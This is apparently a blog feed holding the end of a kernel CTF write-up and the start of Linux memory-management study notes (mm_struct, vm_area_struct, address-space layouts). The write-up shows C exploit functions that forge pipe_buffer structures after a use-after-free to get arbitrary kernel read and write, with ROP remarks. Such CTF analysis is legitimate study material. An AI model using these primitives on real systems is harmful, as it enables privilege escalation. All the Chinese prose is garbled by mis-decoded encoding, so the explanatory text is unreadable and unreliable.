class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span> =</span> buf-&gt;ops;<br><br>buf-&gt;ops = <span class="hljs-literal">NULL</span>;<br>ops-&gt;release(pipe, buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨anon_pipe_buf_releaseä¸­ï¼Œå¦‚æœpipe_bufferçš„pageæ²¡æœ‰åˆ«äººä½¿ç”¨ä¸”tmp_pageä¸ºç©ºåˆ™å°†è¿™ä¸ªpageæ”¾å…¥tmp_pageå¤‡ç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">anon_pipe_buf_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> pipe_buffer *buf)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><br><span class="hljs-keyword">if</span> (page_count(page) == <span class="hljs-number">1</span> &amp;&amp; !pipe-&gt;tmp_page)<br>pipe-&gt;tmp_page = page;<br><span class="hljs-keyword">else</span><br>put_page(page);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼š</p><ul><li>ä»»ä½•ä¸€é¡µçš„å†…å®¹è¯»å®Œå†å†™å…¥éƒ½ä¼šå¦èµ·ä¸€ä¸ªpipe_buffer</li><li>pipe_buffer-&gt;flagsæ²¡æœ‰0x10æ¯æ¬¡å†™å…¥ä¹‹åéƒ½ä¼šå¦èµ·ä¸€ä¸ªpipe_buffer</li></ul></blockquote><h2 id="ç®€å•ä¸€äº›çš„åˆ©ç”¨æ–¹å¼"><a href="#ç®€å•ä¸€äº›çš„åˆ©ç”¨æ–¹å¼" class="headerlink" title="ç®€å•ä¸€äº›çš„åˆ©ç”¨æ–¹å¼"></a>ç®€å•ä¸€äº›çš„åˆ©ç”¨æ–¹å¼</h2><p>æœ‰è¿™ä¸ªç‰¹æ€§åˆ©ç”¨çš„æ—¶å€™å…¶å®å¯ä»¥ä¸ç”¨é‚£ä¹ˆå¤æ‚</p><p>æ­¤æ—¶æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªuaf</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp1.png" class title="tmp1"><ul><li><p>åˆ©ç”¨victim writeä¿®æ”¹snd_victimçš„ç›®æ ‡pipe_bufferï¼ŒæŒ‡å‘è¦æ”¹çš„page</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp2.png" class title="tmp2"></li><li><p>victim readè¯»å®Œåˆšä¿®æ”¹çš„å­—èŠ‚æ•°</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp3.png" class title="tmp3"><p>è¿™æ—¶victimä¼šå°†snd_victimæ‰€åœ¨pageæ”¾å›tmp_page</p></li><li><p>victimå†æ¬¡writeçš„æ—¶å€™ä¼šå¦èµ·ä¸€ä¸ªpipe_bufferï¼Œä½¿ç”¨tmp_pageï¼Œä¹Ÿå°±æ˜¯snd_victimæ‰€åœ¨çš„pageï¼Œè¿™æ ·å°±è¾¾åˆ°äº†é‡å¤ä¿®æ”¹snd_victimçš„ç›®çš„</p><img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/tmp4.png" class title="tmp4"><p>ä¸ç”¨æ‹…å¿ƒpipe_bufferæ¶ˆè€—å®Œçš„äº‹æƒ…ï¼Œpipe_bufferä¼šå¾ªç¯ä½¿ç”¨( â€¢Ì€ Ï‰ â€¢Ì )âœ§</p></li></ul><h2 id="expéœ€è¦ä¿®æ”¹çš„éƒ¨åˆ†"><a href="#expéœ€è¦ä¿®æ”¹çš„éƒ¨åˆ†" class="headerlink" title="expéœ€è¦ä¿®æ”¹çš„éƒ¨åˆ†"></a>expéœ€è¦ä¿®æ”¹çš„éƒ¨åˆ†</h2><p><em>å…¶å®ä¸éœ€è¦ä¸¤æ¬¡uafï¼Œä½†æˆ‘ç”¨ç¬¬äºŒæ¬¡uafæ¥ç¡®å®špipd_bufferçš„indexäº†</em></p><ul><li><p>mainå‡½æ•°ä¸­åˆ å»building_self_writing_pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//building_self_writing_pipe();</span><br>  <br>info_leaking_by_arbitrary_pipe();<br></code></pre></td></tr></table></figure></li><li><p>setup_evil_pipeï¼Œæ¶ˆè€—ä¹‹å‰writeçš„å­—èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">setup_evil_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">0x60</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>arbitrary_read_by_pipeï¼Œè¦æ”¹çš„pipe_bufferæ˜¯ç¬¬ä¸‰ä¸ª</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_read, <span class="hljs-type">void</span> *dst)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-comment">/* page to read */</span><br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0x1ff8</span>;<br>    evil_2nd_buf.page = page_to_read;<br>    evil_2nd_buf.ops = info_pipe_buf.ops;<br>    evil_2nd_buf.private = info_pipe_buf.private;<br>    evil_2nd_buf.flags = info_pipe_buf.flags;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><br>    read(pipe_fd[snd_vicitm_pid][<span class="hljs-number">0</span>], dst, <span class="hljs-number">0xfff</span>);<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span> + <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>arbitrary_write_by_pipe</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> page *page_to_write, <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    <span class="hljs-type">char</span> temp_buf[<span class="hljs-number">0x1000</span>];<br><br>    evil_2nd_buf.page = page_to_write;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.ops = info_pipe_buf.ops;<br>    evil_2nd_buf.flags = info_pipe_buf.flags;<br>    evil_2nd_buf.private = info_pipe_buf.private;<br><br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], temp_zero_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span>);<br>    write(pipe_fd[victim_pid][<span class="hljs-number">1</span>], &amp;evil_2nd_buf, <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br><br>    write(pipe_fd[snd_vicitm_pid][<span class="hljs-number">1</span>], src, <span class="hljs-number">0xfff</span>);<br><br>    read(pipe_fd[victim_pid][<span class="hljs-number">0</span>], temp_buf, <span class="hljs-number">96</span>*<span class="hljs-number">2</span> + <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>ropçš„æ—¶å€™rspè¦åŠ 8</p></li></ul><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><p>KASLRæœºåˆ¶ï¼Œç‰©ç†å†…å­˜æ¢æµ‹å’Œæ˜ å°„ä»€ä¹ˆçš„ï¼ˆå…¶å®å°±æ˜¯ç»§ç»­ç³»ç»Ÿå¯åŠ¨ï¼Œä¹ï¼‰</p></li><li><p>What is CFI?</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Kernel</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>kernel</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kernelæºç åˆ†æ-å†…å­˜ç®¡ç†</title>
    <link href="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>æ•´ç†ç ´ç¢çš„çŸ¥è¯†ä½“ç³»â€¦â€¦</p><p>æ ¹æ®è¿™ä¸ªå¤§ä½¬çš„å…¬ä¼—å·ğŸ‘‰<a href="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=Mzg2MzU3Mjc3Ng==&action=getalbum&album_id=2559805446807928833&scene=173&from_msgid=2247488210&from_itemidx=1&count=3&nolastread=1#wechat_redirect">#èŠèŠLinuxå†…æ ¸</a></p><span id="more"></span><p>å†…æ ¸ç‰ˆæœ¬5.19ï¼ˆbuddy systemå‰ï¼‰ï¼Œ5.4ï¼ˆbuddy systemå³ä¹‹åï¼‰</p><h1 id="è™šæ‹Ÿå†…å­˜ç®¡ç†"><a href="#è™šæ‹Ÿå†…å­˜ç®¡ç†" class="headerlink" title="è™šæ‹Ÿå†…å­˜ç®¡ç†"></a>è™šæ‹Ÿå†…å­˜ç®¡ç†</h1><p>å…ˆæ”¾ä¸€å¼ ç»“æ„å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/mm_struct.png" class title="mm_struct"><ul><li>task_structçš„mmæŒ‡å‘mm_structç»“æ„ä½“</li><li>mm_structçš„mmapæˆå‘˜æŒ‡å‘vm_area_structåŒå‘é“¾è¡¨çš„å¤´èŠ‚ç‚¹</li><li>vm_area_structé€šè¿‡åŒå‘é“¾è¡¨ä¸²è”</li><li>vm_area_structçš„vm_mmæŒ‡å‘æ‰€å±çš„mm_struct</li><li>mm_structçš„mm_rbé€šè¿‡çº¢é»‘æ ‘ç»„ç»‡æ‰€æœ‰vm_area_struct</li><li>vm_area_structçš„vm_rbæŒ‡å‘æ‰€å±çº¢é»‘æ ‘</li></ul><p>æ–°ç‰ˆæœ¬çš„vm_area_structæ”¹ç”¨maple_treeç»„ç»‡äº†</p><h2 id="mm-structç»“æ„ä½“"><a href="#mm-structç»“æ„ä½“" class="headerlink" title="mm_structç»“æ„ä½“"></a>mm_structç»“æ„ä½“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">mmap</span>;</span><span class="hljs-comment">/* list of VMAs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root</span> <span class="hljs-title">mm_rb</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> task_size;<span class="hljs-comment">/* size of task vm space */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_vm;   <span class="hljs-comment">/* Total pages mapped */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> locked_vm;   <span class="hljs-comment">/* Pages that have PG_mlocked set */</span><br><span class="hljs-type">atomic64_t</span>    pinned_vm;   <span class="hljs-comment">/* Refcount permanently increased */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data_vm;   <span class="hljs-comment">/* VM_WRITE &amp; ~VM_SHARED &amp; ~VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> exec_vm;   <span class="hljs-comment">/* VM_EXEC &amp; ~VM_WRITE &amp; ~VM_STACK */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_vm;   <span class="hljs-comment">/* VM_STACK */</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code, end_code, start_data, end_data;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_brk, brk, start_stack;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg_start, arg_end, env_start, env_end;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>task_sizeï¼šç”¨æˆ·ç©ºé—´è™šæ‹Ÿåœ°å€å¤§å°ï¼Œç­‰äºTASK_SIZEå®ï¼Œ64ä½æ˜¯0x00007ffffffff000</li><li>å®šä¹‰å†…å­˜åŒºåŸŸçš„æˆå‘˜ï¼š<ul><li>start_codeï¼Œend_codeï¼šä»£ç æ®µ</li><li>start_dataï¼Œend_dataï¼šæ•°æ®æ®µ</li><li>start_brkï¼Œbrkï¼šå †åœ°å€èµ·å§‹åœ°å€ï¼Œç»“æŸåœ°å€</li><li>mmap_baseï¼šå†…å­˜æ˜ å°„åŒºèµ·å§‹åœ°å€</li><li>start_stackï¼šæ ˆèµ·å§‹ä½ç½®ï¼ˆæ ˆåº•ï¼‰</li><li>arg_startï¼Œarg_endï¼šå‚æ•°åˆ—è¡¨</li><li>env_startï¼Œenv_endï¼šç¯å¢ƒå˜é‡</li></ul></li><li>ç‰©ç†å†…å­˜æ˜ å°„å†…å®¹ç›¸å…³ç»Ÿè®¡å˜é‡ï¼š<ul><li>total_vmï¼šè¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­æ˜ å°„ç‰©ç†å†…å­˜é¡µçš„æ€»æ•°</li><li>locked_vmï¼šé”å®šä¸èƒ½æ¢å‡ºçš„å†…å­˜é¡µæ€»æ•°</li><li>pinned_vmï¼šæ—¢ä¸èƒ½æ¢å‡ºï¼Œä¹Ÿä¸èƒ½ç§»åŠ¨çš„å†…å­˜é¡µæ€»æ•°</li><li>data_vmï¼šæ•°æ®æ®µä¸­æ˜ å°„çš„å†…å­˜é¡µæ•°ç›®</li><li>exec_vmï¼šä»£ç æ®µä¸­å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶çš„å†…å­˜é¡µæ•°ç›®</li><li>stack_vmï¼šæ ˆä¸­æ‰€æ˜ å°„çš„å†…å­˜é¡µæ•°ç›®</li></ul></li></ul><h2 id="vm-area-structç»“æ„ä½“"><a href="#vm-area-structç»“æ„ä½“" class="headerlink" title="vm_area_structç»“æ„ä½“"></a>vm_area_structç»“æ„ä½“</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_start;<span class="hljs-comment">/* Our start address within vm_mm. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_end;<br>    <br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vm_next</span>, *<span class="hljs-title">vm_prev</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_node</span> <span class="hljs-title">vm_rb</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span><span class="hljs-comment">/* The address space we belong to. */</span><br><br><span class="hljs-type">pgprot_t</span> vm_page_prot;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_flags;<span class="hljs-comment">/* Flags, see mm.h. */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">anon_vma</span> *<span class="hljs-title">anon_vma</span>;</span><span class="hljs-comment">/* Serialized by page_table_lock */</span><br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> vm_pgoff;<span class="hljs-comment">/* Offset (within vm_file) in PAGE_SIZE</span><br><span class="hljs-comment">   units */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> * <span class="hljs-title">vm_file</span>;</span><span class="hljs-comment">/* File we map to (can be NULL). */</span><br><span class="hljs-type">void</span> * vm_private_data;<span class="hljs-comment">/* was vm_pte (shared mem) */</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><ul><li><p>vm_startï¼Œvm_endï¼šè™šæ‹Ÿåœ°å€èŒƒå›´ï¼ˆå·¦é—­å³å¼€ï¼‰</p><ul><li>vm_page_protï¼šé¡µçº§åˆ«è®¿é—®æ§åˆ¶</li><li>vm_flagsï¼šè™šæ‹Ÿå†…å­˜è®¿é—®æ§åˆ¶</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">vma-&gt;vm_page_prot = vm_get_page_prot(vma-&gt;vm_flags) <span class="hljs-comment">// è½¬æ¢</span><br></code></pre></td></tr></table></figure></li><li><p>vm_fileï¼šå…³è”è¢«æ˜ å°„çš„æ–‡ä»¶</p></li><li><p>vm_pgoffï¼šæ˜ å°„è¿›è™šæ‹Ÿå†…å­˜ä¸­çš„æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ–‡ä»¶ä¸­çš„åç§»</p></li><li><p>anon_vmaï¼šåŒ¿åæ˜ å°„</p></li><li><p>vm_private_dataï¼šç”¨äºå­˜å‚¨VMAä¸­çš„ç§æœ‰æ•°æ®</p></li><li><p>vm_opsï¼šé’ˆå¯¹è™šæ‹Ÿå†…å­˜åŒºåŸŸVMAçš„ç›¸å…³æ“ä½œçš„å‡½æ•°æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> &#123;</span><br><span class="hljs-type">void</span> (*open)(<span class="hljs-keyword">struct</span> vm_area_struct * area);<br><span class="hljs-type">void</span> (*close)(<span class="hljs-keyword">struct</span> vm_area_struct * area);<br><span class="hljs-type">vm_fault_t</span> (*fault)(<span class="hljs-keyword">struct</span> vm_fault *vmf);<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>openï¼šæŒ‡å®šçš„è™šæ‹Ÿå†…å­˜åŒºåŸŸè¢«åŠ å…¥åˆ°è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­æ—¶è°ƒç”¨</li><li>closeï¼šè™šæ‹Ÿå†…å­˜åŒºåŸŸVMAä»è¿›ç¨‹è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­è¢«åˆ é™¤æ—¶è°ƒç”¨</li><li>faultï¼šå‘ç”Ÿç¼ºé¡µå¼‚å¸¸æ—¶è°ƒç”¨ï¼ˆæœªåˆ†é…ç‰©ç†é¡µæˆ–è¢«æ¢å‡ºï¼‰</li><li>page_mkwriteï¼šå½“ä¸€ä¸ªåªè¯»çš„é¡µé¢å°†è¦å˜ä¸ºå¯å†™æ—¶è°ƒç”¨</li></ul></li></ul><h2 id="è™šæ‹Ÿå†…å­˜ç©ºé—´å¸ƒå±€"><a href="#è™šæ‹Ÿå†…å­˜ç©ºé—´å¸ƒå±€" class="headerlink" title="è™šæ‹Ÿå†…å­˜ç©ºé—´å¸ƒå±€"></a>è™šæ‹Ÿå†…å­˜ç©ºé—´å¸ƒå±€</h2><h3 id="32ä½"><a href="#32ä½" class="headerlink" title="32ä½"></a>32ä½</h3><p>è¿˜æ˜¯å…ˆæ”¾ä¸€å¼ å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/32%E4%BD%8D.png" class title="32ä½"><ul><li><p>å‰896Mç‰©ç†å†…å­˜ç›´æ¥æ˜ å°„åˆ°3Gâ€”3G+896M</p><ul><li>å‰1Mè¢«ç³»ç»Ÿå¯åŠ¨å ç”¨ï¼ˆBIOSä»€ä¹ˆçš„ï¼‰</li><li>åé¢æ˜¯å†…æ ¸ä»£ç æ®µï¼Œæ•°æ®æ®µï¼ŒBSSæ®µ</li><li>è¿›ç¨‹ç›¸å…³çš„æ•°æ®ç»“æ„ï¼Œå†…æ ¸æ ˆä¹Ÿä¼šå­˜æ”¾åœ¨ç‰©ç†å†…å­˜å‰896Mçš„è¿™æ®µåŒºåŸŸä¸­</li></ul><p>X86 ä½“ç³»ç»“æ„ä¸‹ï¼ŒISAæ€»çº¿çš„DMAï¼ˆç›´æ¥å†…å­˜å­˜å–ï¼‰æ§åˆ¶å™¨ï¼Œåªèƒ½å¯¹å†…å­˜çš„å‰16M è¿›è¡Œå¯»å€ï¼Œæ‰€ä»¥ç›´æ¥æ˜ å°„åŒºåˆåˆ†ä¸ºDMAæ˜ å°„åŒºå’ŒNORMALæ˜ å°„åŒº</p></li><li><p>å‰©ä¸‹çš„ç‰©ç†å†…å­˜åŠ¨æ€æ˜ å°„åˆ°vmallocåŠ¨æ€æ˜ å°„åŒºï¼Œä½¿ç”¨vmallocè¿›è¡Œåˆ†é…ï¼Œåˆ†é…çš„ç‰©ç†é¡µæ˜¯ä¸è¿ç»­çš„</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/vmalloc.png" class title="vmalloc"></li><li><p>æ°¸ä¹…æ˜ å°„åŒºå…è®¸å»ºç«‹ä¸ç‰©ç†é«˜ç«¯å†…å­˜ï¼ˆ896Mä»¥ä¸Šï¼‰çš„é•¿æœŸæ˜ å°„å…³ç³»ï¼Œæ¯”å¦‚å†…æ ¸é€šè¿‡ alloc_pages() å‡½æ•°åœ¨ç‰©ç†å†…å­˜çš„é«˜ç«¯å†…å­˜ä¸­ç”³è¯·è·å–åˆ°çš„ç‰©ç†å†…å­˜é¡µï¼Œè¿™äº›ç‰©ç†å†…å­˜é¡µå¯ä»¥é€šè¿‡è°ƒç”¨ kmap æ˜ å°„åˆ°æ°¸ä¹…æ˜ å°„åŒºä¸­</p></li><li><p>å›ºå®šæ˜ å°„åŒºç±»ä¼¼æ°¸ä¹…æ˜ å°„åŒºï¼Œä½†æ˜ å°„çš„ç‰©ç†é¡µæ˜¯å›ºå®šçš„ï¼Œåœ¨ç¼–è¯‘æœŸé—´å°±å·²ç»ç¡®å®š</p></li><li><p>ä¸´æ—¶æ˜ å°„åŒºç”¨äºæ‹·è´ç‰©ç†é¡µæ—¶ä¸´æ—¶å°†ç‰©ç†å†…å­˜é¡µæ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜</p></li></ul><h3 id="64ä½"><a href="#64ä½" class="headerlink" title="64ä½"></a>64ä½</h3><p>ä¾ç„¶å…ˆæ”¾ä¸€å¼ å›¾</p><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/64%E4%BD%8D.png" class title="64ä½"><p>å¤§éƒ¨åˆ†åœ¨32ä½éƒ½æœ‰</p><ul><li>è™šæ‹Ÿå†…å­˜æ˜ å°„åŒºç”¨äºå­˜æ”¾pageç»“æ„ä½“</li><li>ä»£ç æ®µç”¨äºæ˜ å°„å†…æ ¸ä»£ç </li></ul><h1 id="ç‰©ç†å†…å­˜ç®¡ç†"><a href="#ç‰©ç†å†…å­˜ç®¡ç†" class="headerlink" title="ç‰©ç†å†…å­˜ç®¡ç†"></a>ç‰©ç†å†…å­˜ç®¡ç†</h1><h2 id="ç‰©ç†å†…å­˜æ¨¡å‹"><a href="#ç‰©ç†å†…å­˜æ¨¡å‹" class="headerlink" title="ç‰©ç†å†…å­˜æ¨¡å‹"></a>ç‰©ç†å†…å­˜æ¨¡å‹</h2><h3 id="FLATMEMå¹³å¦å†…å­˜æ¨¡å‹"><a href="#FLATMEMå¹³å¦å†…å­˜æ¨¡å‹" class="headerlink" title="FLATMEMå¹³å¦å†…å­˜æ¨¡å‹"></a>FLATMEMå¹³å¦å†…å­˜æ¨¡å‹</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/FLATMEM.png" class title="FLATMEM"><p>ä¸€ä¸ªpageå…¨å±€æ•°ç»„mem_mapç®¡å…¨éƒ¨</p><p>pfnå’Œpageçš„è½¬æ¢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_FLATMEM)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __pfn_to_page(pfn)(mem_map + ((pfn) - ARCH_PFN_OFFSET))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __page_to_pfn(page)((unsigned long)((page) - mem_map) + \</span><br><span class="hljs-meta"> ARCH_PFN_OFFSET)</span><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_DISCONTIGMEM)</span><br></code></pre></td></tr></table></figure><h3 id="DISCONTIGMEMéè¿ç»­å†…å­˜æ¨¡å‹"><a href="#DISCONTIGMEMéè¿ç»­å†…å­˜æ¨¡å‹" class="headerlink" title="DISCONTIGMEMéè¿ç»­å†…å­˜æ¨¡å‹"></a>DISCONTIGMEMéè¿ç»­å†…å­˜æ¨¡å‹</h3><img src="/2023/11/13/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/DISCONTIGMEM.png" class title="DISCONTIGMEM"><p>pglist_dataè¡¨ç¤ºnode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 